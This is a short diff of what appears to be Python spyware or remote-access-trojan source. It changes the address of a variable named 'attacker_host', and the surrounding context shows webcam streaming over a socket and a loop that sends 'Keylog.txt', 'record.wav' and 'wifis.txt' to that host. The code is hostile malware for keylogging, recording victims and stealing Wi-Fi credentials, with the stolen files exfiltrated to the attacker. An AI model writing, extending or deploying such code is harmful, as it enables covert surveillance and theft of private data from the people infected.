@@ -215,6 +215,7 @@ def capturevid(conn):
             print(f"Error closing connection: {e}")
 
 
+
 def camsender(port=5002):
     host = "0.0.0.0"
     with socket.socket() as sock:
@@ -268,7 +269,7 @@ if __name__ == "__main__":
         MAX_IMAGE_DGRAM = MAX_DGRAM - 64
         threadcam = threading.Thread(target=camsender, args=(options.port + 2,))
         threadcam.start()
-    attacker_host = '192.168.1.2'
+    attacker_host = '192.168.1.3'
     file_transfer_port = options.port + 3
     files_to_send = ["Keylog.txt", "record.wav", "wifis.txt"]
     while True:
